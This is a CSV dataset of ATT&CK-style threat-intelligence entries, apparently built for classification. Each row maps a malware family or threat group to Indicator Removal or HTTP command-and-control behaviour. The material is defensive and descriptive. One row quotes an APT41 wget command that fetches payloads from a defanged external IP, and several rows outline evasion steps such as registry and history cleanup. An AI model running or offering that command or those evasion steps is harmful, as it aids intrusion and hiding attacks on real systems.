technique_ID,sub_technique_ID,technique_name,technique
T1070,T1070,Indicator Removal,"DarkWatchman can uninstall malicious components from the Registry, stop processes, and clear the browser history."
T1070,T1070,Indicator Removal,Donut can erase file references to payloads in-memory after being reflectively loaded and executed.
T1070,T1070,Indicator Removal,"EVILNUM has a function called ""DeleteLeftovers"" to remove certain artifacts of the attack."
T1070,T1070,Indicator Removal,Flagpro can close specific Windows Security and Internet Explorer dialog boxes to mask external connections.
T1070,T1070,Indicator Removal,FunnyDream has the ability to clean traces of malware deployment.
T1070,T1070,Indicator Removal,HermeticWiper can disable pop-up information about folders and desktop items and delete Registry keys to hide malicious services.
T1070,T1070,Indicator Removal,Lazarus Group has restored malicious KernelCallbackTable code to its original state after the process execution flow has been hijacked.
T1070,T1070,Indicator Removal,"Maze has used the ""Wow64RevertWow64FsRedirection"" function following attempts to delete the shadow volumes, in order to leave the system in the same state as it was prior to redirection."
T1070,T1070,Indicator Removal,"Metamorfo has a command to delete a Registry key it uses, \Software\Microsoft\Internet Explorer\notes."
T1070,T1070,Indicator Removal,Neoichor can clear the browser history on a compromised host by changing the ClearBrowsingHistoryOnExit value to 1 in the HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Privacy Registry key.
T1070,T1070,Indicator Removal,Orz can overwrite Registry settings to reduce its visibility on the victim.
T1070,T1070,Indicator Removal,Rising Sun can clear a memory blog in the process by overwriting it with junk bytes.
T1070,T1070,Indicator Removal,Sardonic has the ability to delete created WMI objects to evade detections.
T1070,T1070,Indicator Removal,SDBbot has the ability to clean up and remove data structures from a compromised host.
T1070,T1070,Indicator Removal,ShadowPad has deleted arbitrary Registry values.
T1070,T1070,Indicator Removal,Sibot will delete an associated registry key if a certain server response is received.
T1070,T1070,Indicator Removal,"SILENTTRINITY can remove artifacts from the compromised host, including created Registry keys."
T1070,T1070,Indicator Removal,"During the SolarWinds Compromise, APT29 temporarily replaced legitimate utilities with their own, executed their payload, and then restored the original file."
T1070,T1070,Indicator Removal,Stuxnet can delete OLE Automation and SQL stored procedures used to store malicious payloads.
T1070,T1070,Indicator Removal,SUNBURST removed HTTP proxy registry values to clean up traces of execution.
T1071,T1071.001,Application Layer Protocol: Web Protocols,"During the 2015 Ukraine Electric Power Attack, Sandworm Team used BlackEnergy to communicate between compromised hosts and their command-and-control servers via HTTP post requests. "
T1071,T1071.001,Application Layer Protocol: Web Protocols,3PARA RAT uses HTTP for command and control.
T1071,T1071.001,Application Layer Protocol: Web Protocols,4H RAT uses HTTP for command and control.
T1071,T1071.001,Application Layer Protocol: Web Protocols,ABK has the ability to use HTTP in communications with C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Action RAT can use HTTP to communicate with C2 servers.
T1071,T1071.001,Application Layer Protocol: Web Protocols,ADVSTORESHELL connects to port 80 of a C2 server using Wininet API. Data is exchanged via HTTP POSTs.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Agent Tesla has used HTTP for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Amadey has used HTTP for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Anchor has used HTTP and HTTPS in C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,ANDROMEDA has the ability to make GET requests to download files from C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,AppleJeus has sent data to its C2 server via POST requests.
T1071,T1071.001,Application Layer Protocol: Web Protocols,AppleSeed has the ability to communicate with C2 over HTTP.
T1071,T1071.001,Application Layer Protocol: Web Protocols,APT18 uses HTTP for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,APT19 used HTTP for C2 communications. APT19 also used an HTTP malware variant to communicate over HTTP for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,"Later implants used by APT28, such as CHOPSTICK, use a blend of HTTP, HTTPS, and other legitimate channels for C2, depending on module configuration."
T1071,T1071.001,Application Layer Protocol: Web Protocols,APT32 has used JavaScript that communicates over HTTP or HTTPS to attacker controlled domains to download additional frameworks. The group has also used downloaded encrypted payloads over HTTP.
T1071,T1071.001,Application Layer Protocol: Web Protocols,APT33 has used HTTP for command and control.
T1071,T1071.001,Application Layer Protocol: Web Protocols,APT37 uses HTTPS to conceal C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,"APT38 used a backdoor, QUICKRIDE, to communicate to the C2 server over HTTP and HTTPS."
T1071,T1071.001,Application Layer Protocol: Web Protocols,APT39 has used HTTP in communications with C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,APT41 used HTTP to download payloads for CVE-2019-19781 and CVE-2020-10189 exploits.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Aria-body has used HTTP in C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,AuTo Stealer can use HTTP to communicate with its C2 servers.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Avenger has the ability to use HTTP in communication with C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,BackConfig has the ability to use HTTPS for C2 communiations.
T1071,T1071.001,Application Layer Protocol: Web Protocols,BACKSPACE uses HTTP as a transport to communicate with its command server.
T1071,T1071.001,Application Layer Protocol: Web Protocols,BADHATCH can use HTTP and HTTPS over port 443 to communicate with actor-controlled C2 servers.
T1071,T1071.001,Application Layer Protocol: Web Protocols,BADNEWS establishes a backdoor over HTTP.
T1071,T1071.001,Application Layer Protocol: Web Protocols,BadPatch uses HTTP for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Bankshot uses HTTP for command and control communication.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Bazar can use HTTP and HTTPS over ports 80 and 443 in C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,BBK has the ability to use HTTP in communications with C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,BBSRAT uses GET and POST requests over HTTP or HTTPS for command and control to obtain commands and send ZLIB compressed data back to the C2 server.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Bisonal has used HTTP for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,BITTER has used HTTP POST requests for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,BlackEnergy communicates with its C2 server over HTTP.
T1071,T1071.001,Application Layer Protocol: Web Protocols,BlackMould can send commands to C2 in the body of HTTP POST requests.
T1071,T1071.001,Application Layer Protocol: Web Protocols,BLINDINGCAN has used HTTPS over port 443 for command and control.
T1071,T1071.001,Application Layer Protocol: Web Protocols,BLUELIGHT can use HTTP/S for C2 using the Microsoft Graph API.
T1071,T1071.001,Application Layer Protocol: Web Protocols,BoomBox has used HTTP POST requests for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,BRONZE BUTLER malware has used HTTP for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Brute Ratel C4 can use HTTPS and HTTPS for C2 communication.
T1071,T1071.001,Application Layer Protocol: Web Protocols,BUBBLEWRAP can communicate using HTTP or HTTPS.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Bundlore uses HTTP requests for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,"During C0017, APT41 ran wget http://103.224.80[.]44:8080/kernel to download malicious payloads."
T1071,T1071.001,Application Layer Protocol: Web Protocols,"During C0018, the threat actors used HTTP for C2 communications."
T1071,T1071.001,Application Layer Protocol: Web Protocols,"During C0021, the threat actors used HTTP for some of their C2 communications."
T1071,T1071.001,Application Layer Protocol: Web Protocols,The Carbanak malware communicates to its command server using HTTP with an encrypted payload.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Carberp has connected to C2 servers via HTTP.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Carbon can use HTTP in C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Cardinal RAT is downloaded using HTTP over port 443.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Chaes has used HTTP for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,CharmPower can use HTTP to communicate with C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,ChChes communicates to its C2 server over HTTP and embeds data within the Cookie HTTP header.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Chimera has used HTTPS for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,China Chopper's server component executes code sent via HTTP POST commands.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Various implementations of CHOPSTICK communicate with C2 over HTTP.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Clambling has the ability to communicate over HTTP.
T1071,T1071.001,Application Layer Protocol: Web Protocols,One variant of CloudDuke uses HTTP and HTTPS for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Cobalt Group has used HTTPS for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Cobalt Strike can use a custom command and control protocol that can be encapsulated in HTTP or HTTPS. All protocols use their standard assigned ports.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Comnie uses HTTP for C2 communication.
T1071,T1071.001,Application Layer Protocol: Web Protocols,ComRAT has used HTTP requests for command and control.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Confucius has used HTTP for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,CORESHELL can communicate over HTTP for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,CosmicDuke can use HTTP or HTTPS for command and control to hard-coded C2 servers.
T1071,T1071.001,Application Layer Protocol: Web Protocols,CozyCar's main method of communicating with its C2 servers is using HTTP or HTTPS.
T1071,T1071.001,Application Layer Protocol: Web Protocols,CreepyDrive can use HTTPS for C2 using the Microsoft Graph API.
T1071,T1071.001,Application Layer Protocol: Web Protocols,CreepySnail can use HTTP for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Crimson can use a HTTP GET request to download its final payload.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Crutch has conducted C2 communications with a Dropbox account using the HTTP API.
T1071,T1071.001,Application Layer Protocol: Web Protocols,CSPY Downloader can use GET requests to download additional payloads from C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Cyclops Blink can download files via HTTP and HTTPS.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Dacls can use HTTPS in C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,DanBot can use HTTP in C2 communication.
T1071,T1071.001,Application Layer Protocol: Web Protocols,"Dark Caracal's version of Bandook communicates with their server over a TCP port using HTTP payloads Base64 encoded and suffixed with the string ""&&&""."
T1071,T1071.001,Application Layer Protocol: Web Protocols,DarkComet can use HTTP for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,DarkTortilla has used HTTP and HTTPS for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,DarkWatchman uses HTTPS for command and control.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Daserf uses HTTP for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,DealersChoice uses HTTP for communication with the C2 server.
T1071,T1071.001,Application Layer Protocol: Web Protocols,DEATHRANSOM can use HTTPS to download files.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Diavol has used HTTP GET and POST requests for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Dipsind uses HTTP for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Doki has communicated with C2 over HTTPS.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Donut can use HTTP to download previously staged shellcode payloads.
T1071,T1071.001,Application Layer Protocol: Web Protocols,down_new has the ability to use HTTP in C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,DownPaper communicates to its C2 server over HTTP.
T1071,T1071.001,Application Layer Protocol: Web Protocols,DRATzarus can use HTTP or HTTPS for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Dridex has used POST requests and HTTPS for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Drovorub can use the WebSocket protocol and has initiated communication with C2 servers with an HTTP Upgrade request.
T1071,T1071.001,Application Layer Protocol: Web Protocols,DustySky has used both HTTP and HTTPS for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Dyre uses HTTPS for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Egregor has communicated with its C2 servers via HTTPS protocol.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Elise communicates over HTTP or HTTPS for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,ELMER uses HTTP for command and control.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Emissary uses HTTP or HTTPS for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Emotet has used HTTP for command and control.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Empire can conduct command and control over protocols like HTTP and HTTPS.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Epic uses HTTP and HTTPS for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,EvilBunny has executed C2 commands directly via HTTP.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Exaramel for Linux uses HTTPS for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Explosive has used HTTP for communication.
T1071,T1071.001,Application Layer Protocol: Web Protocols,FatDuke can be controlled via a custom C2 protocol over HTTP.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Felismus uses HTTP for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,FELIXROOT uses HTTP and HTTPS to communicate with the C2 server.
T1071,T1071.001,Application Layer Protocol: Web Protocols,FIN13 has used HTTP requests to chain multiple web shells and to contact actor-controlled C2 servers prior to exfiltrating stolen data.
T1071,T1071.001,Application Layer Protocol: Web Protocols,FIN4 has used HTTP POST requests to transmit data.
T1071,T1071.001,Application Layer Protocol: Web Protocols,FIN8 has used HTTPS for command and control.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Final1stspy uses HTTP for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Flagpro can communicate with its C2 using HTTP.
T1071,T1071.001,Application Layer Protocol: Web Protocols,FlawedAmmyy has used HTTP for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,FoggyWeb has the ability to communicate with C2 servers over HTTP GET/POST requests.
T1071,T1071.001,Application Layer Protocol: Web Protocols,"During Frankenstein, the threat actors used HTTP GET requests for C2."
T1071,T1071.001,Application Layer Protocol: Web Protocols,Gamaredon Group has used HTTP and HTTPS for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Gazer communicates with its C2 servers over HTTP.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Gelsemium can use HTTP/S in C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,GeminiDuke uses HTTP and HTTPS for command and control.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Get2 has the ability to use HTTP to send information collected from an infected host to C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Gold Dragon uses HTTP for communication to the control servers.
T1071,T1071.001,Application Layer Protocol: Web Protocols,GoldenSpy has used the Ryeol HTTP Client to facilitate HTTP internet communication.
T1071,T1071.001,Application Layer Protocol: Web Protocols,GoldFinder has used HTTP for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,GoldMax has used HTTPS and HTTP GET requests with custom HTTP cookies for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Goopy has the ability to communicate with its C2 over HTTP.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Grandoreiro has the ability to use HTTP in C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,GravityRAT uses HTTP for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,GreyEnergy uses HTTP and HTTPS for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,GrimAgent has the ability to use HTTP for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,GuLoader can use HTTP to retrieve additional binaries.
T1071,T1071.001,Application Layer Protocol: Web Protocols,"HAFNIUM has used open-source C2 frameworks, including Covenant."
T1071,T1071.001,Application Layer Protocol: Web Protocols,"The ""Uploader"" variant of HAMMERTOSS visits a hard-coded server over HTTP/S to download the images HAMMERTOSS uses to receive commands."
T1071,T1071.001,Application Layer Protocol: Web Protocols,HAWKBALL has used HTTP to communicate with a single hard-coded C2 server.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Helminth can use HTTP for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Hi-Zor communicates with its C2 server over HTTPS.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Higaisa used HTTP and HTTPS to send data back to its C2 server.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Hikit has used HTTP for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,HTTPBrowser has used HTTP and HTTPS for command and control.
T1071,T1071.001,Application Layer Protocol: Web Protocols,httpclient uses HTTP for command and control.
T1071,T1071.001,Application Layer Protocol: Web Protocols,HyperBro has used HTTPS for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,IceApple can use HTTP GET to request and pull information from C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,IcedID has used HTTPS in communications with C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,"Inception has used HTTP, HTTPS, and WebDav in network communications."
T1071,T1071.001,Application Layer Protocol: Web Protocols,Industroyer’s main backdoor connected to a remote C2 server using HTTPS.
T1071,T1071.001,Application Layer Protocol: Web Protocols,InvisiMole uses HTTP for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Ixeshe uses HTTP for command and control.
T1071,T1071.001,Application Layer Protocol: Web Protocols,JHUHUGIT variants have communicated with C2 servers over HTTP and HTTPS.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Kazuar uses HTTP and HTTPS to communicate with the C2 server. Kazuar can also act as a webserver and listen for inbound HTTP requests through an exposed API.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Ke3chang malware including RoyalCli and BS2005 have communicated over HTTP with the C2 server through Internet Explorer (IE) by using the COM interface IWebBrowser2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Variants of Kevin can communicate with C2 over HTTP.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Keydnap uses HTTPS for command and control.
T1071,T1071.001,Application Layer Protocol: Web Protocols,KEYPLUG has the ability to communicate over HTTP and WebSocket Protocol (WSS) for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,KGH_SPY can send data to C2 with HTTP POST requests.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Kimsuky  has used HTTP GET and POST requests for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Kinsing has communicated with C2 over HTTP.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Koadic has used HTTP for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,The Komplex C2 channel uses HTTP POST requests.
T1071,T1071.001,Application Layer Protocol: Web Protocols,KONNI has used HTTP POST for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,KOPILUWAK has used HTTP POST requests to send data to C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Lazarus Group has conducted C2 over HTTP and HTTPS.
T1071,T1071.001,Application Layer Protocol: Web Protocols,LiteDuke can use HTTP GET requests in C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,LitePower can use HTTP and HTTPS for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Lokibot has used HTTP for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,LookBack’s C2 proxy tool sends data to a C2 server over HTTP.
T1071,T1071.001,Application Layer Protocol: Web Protocols,LOWBALL command and control occurs via HTTPS over port 443.
T1071,T1071.001,Application Layer Protocol: Web Protocols,LuminousMoth has used HTTP for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Machete uses HTTP for Command & Control.
T1071,T1071.001,Application Layer Protocol: Web Protocols,MacSpy uses HTTP for command and control.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Mafalda can use HTTP for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Magic Hound has used HTTP for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,MarkiRAT can initiate communication over HTTP/HTTPS for its C2 server.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Maze has communicated to hard-coded IP addresses via HTTP.
T1071,T1071.001,Application Layer Protocol: Web Protocols,MCMD can use HTTPS in communication with C2 web servers.
T1071,T1071.001,Application Layer Protocol: Web Protocols,MechaFlounder has the ability to use HTTP in communication with C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Metador has used HTTP for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,metaMain can use HTTP for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Metamorfo has used HTTP for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Micropsia uses HTTP and HTTPS for C2 network communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Milan can use HTTPS for communication with C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,MiniDuke uses HTTP and HTTPS for command and control.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Mis-Type network traffic can communicate over HTTP.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Mongall can use HTTP for C2 communication.
T1071,T1071.001,Application Layer Protocol: Web Protocols,More_eggs uses HTTPS for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Mori can communicate using HTTP over IPv4 or IPv6 depending on a flag set.
T1071,T1071.001,Application Layer Protocol: Web Protocols,MuddyWater has used HTTP for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Mustang Panda has communicated with its C2 via HTTP POST requests.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Mythic supports HTTP-based C2 profiles.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Neoichor can use HTTP for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,"NETEAGLE will attempt to detect if the infected host is configured to a proxy. If so, NETEAGLE will send beacons via an HTTP POST request. NETEAGLE will also use HTTP to download resources that contain an IP address and Port Number pair to connect to for further C2."
T1071,T1071.001,Application Layer Protocol: Web Protocols,NETWIRE has the ability to communicate over HTTP.
T1071,T1071.001,Application Layer Protocol: Web Protocols,"During Night Dragon, threat actors used HTTP for C2."
T1071,T1071.001,Application Layer Protocol: Web Protocols,njRAT has used HTTP for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,NOKKI has used HTTP for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Octopus has used HTTP GET and POST requests for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,OilRig has used HTTP for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Okrum uses HTTP for communication with its C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,OLDBAIT can use HTTP for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,OnionDuke uses HTTP and HTTPS for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,OopsIE uses HTTP for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,"During Operation CuckooBees, the threat actors enabled HTTP and HTTPS listeners."
T1071,T1071.001,Application Layer Protocol: Web Protocols,"During Operation Dream Job, Lazarus Group uses HTTP and HTTPS to contact actor-controlled C2 servers."
T1071,T1071.001,Application Layer Protocol: Web Protocols,"During Operation Wocao, threat actors’ XServer tool communicated using HTTP and HTTPS."
T1071,T1071.001,Application Layer Protocol: Web Protocols,Orangeworm has used HTTP for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,OSX_OCEANLOTUS.D can also use use HTTP POST and GET requests to send and receive C2 information.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Out1 can use HTTP and HTTPS in communications with remote hosts.
T1071,T1071.001,Application Layer Protocol: Web Protocols,OutSteel has used HTTP for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,OwaAuth uses incoming HTTP requests with a username keyword and commands and handles them as instructions to perform actions.
T1071,T1071.001,Application Layer Protocol: Web Protocols,P.A.S. Webshell can issue commands via HTTP POST.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Pandora can communicate over HTTP.
T1071,T1071.001,Application Layer Protocol: Web Protocols,PcShare has used HTTP for C2 communication.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Peppy can use HTTP to communicate with C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,PinchDuke transfers files from the compromised host via HTTP or HTTPS to a C2 server.
T1071,T1071.001,Application Layer Protocol: Web Protocols,A PingPull variant can communicate with its C2 servers by using HTTPS.
T1071,T1071.001,Application Layer Protocol: Web Protocols,PLEAD has used HTTP for communications with command and control (C2) servers.
T1071,T1071.001,Application Layer Protocol: Web Protocols,PlugX can be configured to use HTTP for command and control.
T1071,T1071.001,Application Layer Protocol: Web Protocols,pngdowner uses HTTP for command and control.
T1071,T1071.001,Application Layer Protocol: Web Protocols,PoetRAT has used HTTP and HTTPs for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,PolyglotDuke has has used HTTP GET requests in C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Pony has sent collected information to the C2 via HTTP POST request.
T1071,T1071.001,Application Layer Protocol: Web Protocols,PoshC2 can use protocols like HTTP/HTTPS for command and control traffic.
T1071,T1071.001,Application Layer Protocol: Web Protocols,PowerShower has sent HTTP GET and POST requests to C2 servers to send information and receive instructions.
T1071,T1071.001,Application Layer Protocol: Web Protocols,POWERTON has used HTTP/HTTPS for C2 traffic.
T1071,T1071.001,Application Layer Protocol: Web Protocols,PowGoop can send HTTP GET requests to malicious servers.
T1071,T1071.001,Application Layer Protocol: Web Protocols,POWRUNER can use HTTP for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Proxysvc uses HTTP over SSL to communicate commands with the control server.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Psylo uses HTTPS for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Pteranodon can use HTTP for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,PUNCHBUGGY enables remote interaction and can obtain additional code over HTTPS GET and POST requests.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Pupy can communicate over HTTP for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,QakBot has the ability to use HTTP and HTTPS in communication with C2 servers.
T1071,T1071.001,Application Layer Protocol: Web Protocols,QUADAGENT uses HTTPS and HTTP for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,QUIETCANARY can use HTTPS for C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,QuietSieve can use HTTPS in C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,RainyDay can use HTTP in C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Ramsay has used HTTP for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Rancor has used HTTP for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,RATANKBA uses HTTP/HTTPS for command and control communication.
T1071,T1071.001,Application Layer Protocol: Web Protocols,RCSession can use HTTP in C2 communications.
T1071,T1071.001,Application Layer Protocol: Web Protocols,"RDAT can use HTTP communications for C2, as well as using the WinHTTP library to make requests to the Exchange Web Services API."
T1071,T1071.001,Application Layer Protocol: Web Protocols,Some Reaver variants use HTTP for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,RedLeaves can communicate to its C2 over HTTP and HTTPS if directed.
T1071,T1071.001,Application Layer Protocol: Web Protocols,"The Regin malware platform supports many standard protocols, including HTTP and HTTPS."
T1071,T1071.001,Application Layer Protocol: Web Protocols,Remexi uses BITSAdmin to communicate with the C2 server over HTTP.
T1071,T1071.001,Application Layer Protocol: Web Protocols,Remsec is capable of using HTTP and HTTPS for C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,REvil has used HTTP and HTTPS in communication with C2.
T1071,T1071.001,Application Layer Protocol: Web Protocols,RGDoor uses HTTP for C2 communications.
